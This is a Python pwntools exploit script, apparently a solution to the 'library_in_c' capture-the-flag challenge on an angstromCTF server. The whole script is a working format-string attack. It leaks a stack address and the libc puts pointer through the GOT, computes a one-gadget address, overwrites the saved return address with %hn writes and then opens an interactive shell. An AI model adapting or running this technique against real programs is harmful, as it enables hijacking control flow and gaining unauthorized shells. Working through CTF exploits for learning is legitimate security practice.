from pwn import *
import time
import sys

"""
for j in range(0,20):
    print("#### "+str(j)+" ####")
    try:
"""
# AAAABBBBCCCCDDDDEEEEFFFFGGG%12$pCCCCDDDD
if len(sys.argv) == 2:
    LOCAL = True#
else:
    LOCAL = False#


# ret addr 0x7fffffffddf8
# leak stak at %29$p 0x7fffffffded8
# 0x7fffffffded8 - 0x7fffffffddf8 = e0
if LOCAL == True:
    r = process("./library_in_c")
    gdb.attach(r, "b *0x40084a\nc")
    one_shot_off = [0x4f2c5, 0x4f322, 0x10a38c]
    system_off = 0x0004f440
    puts_off = 0x000809c0
else:
    r = remote("shell.actf.co", 20201)
    one_shot_off = [0x45216, 0xf1147, 0xf02a4, 0x4526a]
    system_off = 0x00045390
    puts_off = 0x0006f690

puts_got = 0x601018
main = 0x0000000000400747
r.recvuntil("What is your name?")
pad_len = 10
pad = "A"*pad_len
fmt = pad + "..YY..%29$p..XX..%12$s" + p64(puts_got) + p64(puts_got+2) + p64(puts_got+4)
r.sendline(fmt)
r.recvuntil("Why hello there ")
r.recvuntil("..YY..")
data = r.recvuntil("..XX..").replace("..XX..", "")
leak_stack = int(data,16)
ret_addr = leak_stack - 0xe0
data = r.recv(6)+"\x00\x00"
leak = u64(data[:6]+"\x00\x00")
r.recv()
print "[+] leak stack: " + hex(leak_stack)
print "[+] saved ret addr at: " + hex(ret_addr)
libc_base = leak - puts_off
print "[+] libc_base at: " + hex(libc_base)
if LOCAL == True:
    system = libc_base + one_shot_off[1]
else:
    system = libc_base + one_shot_off[1]
print "[+] evaluated system at: " + hex(system)
###### hijack GOT now ######

"""
pad_1 = int("40", 16) - 1
pad_2 = str(int("660", 16) - (pad_1 + 2))
pad_1 = str(pad_1)
#fmt = "%"+ pad_1 +"x.%12$p." +"%"+ pad_2 + "x.%13$p." + "x.%14$p."
fmt = "%"+ pad_1 +"x.%13$n" +"%"+ pad_2 + "x.%12$hn"
"""

pad_2 = int(hex(system)[6:10], 16)
pad_1 = int(hex(system)[10:14], 16) - 11
pad_2 = str(pad_2 - (pad_1+13))
if int(pad_2) < 0:
    print "neg padding!!!"
    exit()
pad_1 = str(pad_1)
fmt = "P"*12 + "%"+ pad_1 + "x.%21$p." + "%" + pad_2 + "x.%22$p." + "CCCCDDDD"+ "EEEEFFFF"
fmt = "P"*10 + "%"+ pad_1 + "x.%21$hn." + "%" + pad_2 + "x.%22$hn." + p64(ret_addr) + p64(ret_addr+2)
r.sendline(fmt)
r.recvuntil(".")
r.recvuntil(".")
r.interactive()
"""
    except:
        None
"""
